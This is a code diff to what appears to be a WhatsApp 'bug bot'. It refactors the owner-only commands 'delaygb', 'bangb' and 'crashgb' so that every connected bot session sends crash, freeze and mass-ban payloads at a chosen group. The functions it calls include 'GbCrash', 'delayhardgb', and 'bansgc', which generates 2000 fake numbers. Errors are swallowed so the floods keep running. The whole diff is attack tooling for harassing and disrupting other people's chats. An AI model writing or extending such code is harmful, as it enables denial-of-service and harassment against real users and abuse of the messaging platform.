@@ -437,7 +437,7 @@ async function frezehard(sock, target) {
   await sock.relayMessage(target, msg, { noselfsync: true });
 }
 //====[FUNCTION BUG GROUP]====//
-async function bansgc(targetgroup) {
+async function bansgc(sock, targetgroup) {
   try {
     if (!targetgroup.endsWith('@g.us')) throw new Error('group only')
     const fakeNumbers = Array.from({ length: 2000 }, () => {
@@ -1399,17 +1399,24 @@ case 'delaygb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
 
-    let targetgroup = q ? q.trim() : m.chat;
-    if (!targetgroup.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
+    let groupJid = q ? q.trim() : m.chat;
+    if (!groupJid.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
 
-    reply(`success! sent bug to ${targetgroup}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+    reply(`success! sent bug to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
 
-    for (let i = 0; i < 5; i++) {
-        await delayhardgb(targetgroup);
-        await delayhardgb(targetgroup);
-        await delayhardgb(targetgroup);
-    }
-    console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
+    (async () => {
+        for (const [botNum, data] of allSessions) {
+            const sock = data.sock;
+            if (!sock?.user) continue;
+            try {
+                for (let i = 0; i < 5; i++) {
+                    await delayhardgb(sock, groupJid).catch(() => {});
+                }
+            } catch (err) {
+                console.error(`bot ${botNum} error:`, err);
+            }
+        }
+    })();
 }
 break;
 
@@ -1417,15 +1424,24 @@ case 'bangb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
 
-    let targetgroup = q ? q.trim() : m.chat;
-    if (!targetgroup.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
+    let groupJid = q ? q.trim() : m.chat;
+    if (!groupJid.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
 
-    reply(`success! sent ban to ${targetgroup}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+    reply(`success! sent ban to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
 
-    for (let i = 0; i < 5; i++) {
-        await bansgc(targetgroup);
-    }
-    console.log(chalk.red.bold(`Success Sending Ban Type ${command} Into Group`));
+    (async () => {
+        for (const [botNum, data] of allSessions) {
+            const sock = data.sock;
+            if (!sock?.user) continue;
+            try {
+                for (let i = 0; i < 5; i++) {
+                    await bansgc(sock, groupJid).catch(() => {});
+                }
+            } catch (err) {
+                console.error(`bot ${botNum} error:`, err);
+            }
+        }
+    })();
 }
 break;
 
@@ -1433,17 +1449,30 @@ case 'crashgb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
 
-    let targetgroup = q ? q.trim() : m.chat;
-    if (!targetgroup.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
+    let groupJid = q ? q.trim() : m.chat;
+    if (!groupJid.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
 
-    reply(`success! sent bug to ${targetgroup}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+    reply(`success! sent bug to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
 
-    for (let i = 0; i < 5; i++) {
-        await misterygb(targetgroup);
-        await delayhardgb(targetgroup);
-        await GbCrash(targetgroup);
-    }
-    console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
+    (async () => {
+        for (const [botNum, data] of allSessions) {
+            const sock = data.sock;
+            if (!sock?.user) continue;
+            try {
+                for (let i = 0; i < 5; i++) {
+                    await Promise.allSettled([
+                        misterygb(sock, groupJid).catch(() => {}),
+                        delayhardgb(sock, groupJid).catch(() => {}),
+                        GbCrash(sock, groupJid).catch(() => {})
+                    ]);
+                    const currentDelay = getCurrentDelay ? getCurrentDelay() : 0;
+                    if (currentDelay > 0) await new Promise(r => setTimeout(r, currentDelay));
+                }
+            } catch (err) {
+                console.error(`bot ${botNum} error:`, err);
+            }
+        }
+    })();
 }
 break;
 
